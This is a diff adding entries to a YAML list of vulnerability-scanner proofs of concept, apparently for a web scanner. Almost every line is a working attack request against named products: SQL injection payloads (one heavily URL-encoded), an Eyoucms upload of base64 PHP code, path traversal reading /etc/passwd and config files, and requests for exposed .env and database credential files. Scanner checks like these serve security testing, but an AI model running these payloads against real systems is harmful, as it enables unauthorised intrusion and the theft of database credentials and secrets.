@@ -161,3 +161,120 @@ pocs:
         - "SQLSTATE"
       matchers-condition: or
       name: "Ruoyi sql vuln"
+    - metch: "get"
+      path: '/?id[where]=1 and updatexml(1,concat(0x7e,user(),0x7e),1) #'
+      body:
+        - "XPATH"
+      matchers-condition: or
+      name: "Djanggo sql vuln"
+    - metch: "get"
+      path: '/search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33'
+      body:
+        - "XPATH"
+      matchers-condition: or
+      name: "Doccms sql vuln"
+    - metch: "post"
+      path: '/search/index.php?keyword=1%25%32%37%25%32%30%25%36%31%25%36%65%25%36%34%25%32%30%25%32%38%25%36%35%25%37%38%25%37%34%25%37%32%25%36%31%25%36%33%25%37%34%25%37%36%25%36%31%25%36%63%25%37%35%25%36%35%25%32%38%25%33%31%25%32%63%25%36%33%25%36%66%25%36%65%25%36%33%25%36%31%25%37%34%25%32%38%25%33%30%25%37%38%25%33%37%25%36%35%25%32%63%25%32%38%25%37%33%25%36%35%25%36%63%25%36%35%25%36%33%25%37%34%25%32%30%25%37%35%25%37%33%25%36%35%25%37%32%25%32%38%25%32%39%25%32%39%25%32%63%25%33%30%25%37%38%25%33%37%25%36%35%25%32%39%25%32%39%25%32%39%25%32%33'
+      data: 'id=0||(updatexml(1,concat(0x7e,(select%20user()),0x7e),1))'
+      header:
+        Content-Type: "application/x-www-form-urlencoded"
+      matchers-condition: or
+      body:
+        - "XPATH"
+      name: "Ecshop sql vuln"
+    - metch: "get"
+      path: '/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136'
+      body:
+        - "XPATH"
+      matchers-condition: or
+      name: "Exrick sql vuln"
+    - metch: "post"
+      path: '/index.php/api/Uploadify/preview'
+      data: 'data:image/php;base64,PD9waHAgcGhwaW5mbygpOw=='
+      body:
+        - "jsonrpc"
+      matchers-condition: or
+      name: "Eyoucms rce vuln"
+    - metch: "get"
+      path: '/mysql_config.ini'
+      body:
+        - "datauser"
+      matchers-condition: or
+      name: "Fanwei database info vuln"
+    - metch: "get"
+      path: '/building/backmgr/urlpage/mobileurl/configfile/jx2_config.ini'
+      body:
+        - "sdbuser"
+      matchers-condition: or
+      name: "Fanwei database info vuln"
+    - metch: "get"
+      path: '/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini'
+      body:
+        - "datauser"
+        - "datapassword"
+        - "dataname"
+      matchers-condition: and
+      name: "Fanwei file read vuln"
+    - metch: "get"
+      path: '/iweboffice/officeserver.php?OPTION=LOADFILE&FILENAME=../iweboffice/officeserver.php'
+      body:
+        - '<?php'
+      matchers-condition: or
+      name: "Fanwei file read vuln"
+    - metch: "get"
+      path: '/api/portalTsLogin/utils/getE9DevelopAllNameValue2?fileName=portaldev_/../../../login/login.jsp'
+      body:
+        - '<%@'
+        - '<?php'
+      matchers-condition: and
+      name: "Fanwei file read vuln"
+    - metch: "get"
+      path: '/portal/SptmForPortalThumbnail.jsp?preview=portal/SptmForPortalThumbnail.jsp'
+      body:
+        - '<%@'
+        - '<?php'
+      matchers-condition: and
+      name: "Fanwei file read vuln"
+    - metch: "get"
+      path: '/plt_document/fragments/content/pdfViewLocal.jsp?path=C:/Windows/Win.ini'
+      body:
+        - 'for 16-bit app support'
+      matchers-condition: or
+      name: "Jindieeas file read vuln"
+    - metch: "get"
+      path: '/api/v1/terminal/sessions/'
+      body:
+        - 'account_id'
+      matchers-condition: or
+      name: "Jumpserver info vuln"
+    - metch: "get"
+      path: '/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa") and extractvalue(1,concat(0x7e,md5(99999999))) -- a'
+      body:
+        - 'ef775988943825d2871e1cfa75473ec'
+      matchers-condition: or
+      name: "Knightcms info vuln"
+    - metch: "get"
+      path: '/storage/logs/laravel.log'
+      body:
+        - 'PDO->__construct'
+      matchers-condition: or
+      name: "Laravel CVE-2024-29291 vuln"
+    - metch: "get"
+      path: '/.env'
+      body:
+        - 'DB_HOST'
+        - 'REDIS_'
+      matchers-condition: or
+      name: "Laravel info vuln"
+    - metch: "get"
+      path: '/include/thumb.php?dir=http\..\..\config\config_db.php'
+      body:
+        - '<?php'
+      matchers-condition: or
+      name: "Metinfo info vuln"
+    - metch: "get"
+      path: '/rewrite?x=/../../../../etc/passwd'
+      body:
+        - 'root:x'
+      matchers-condition: or
+      name: "Nginx/OpenResty file read vuln"
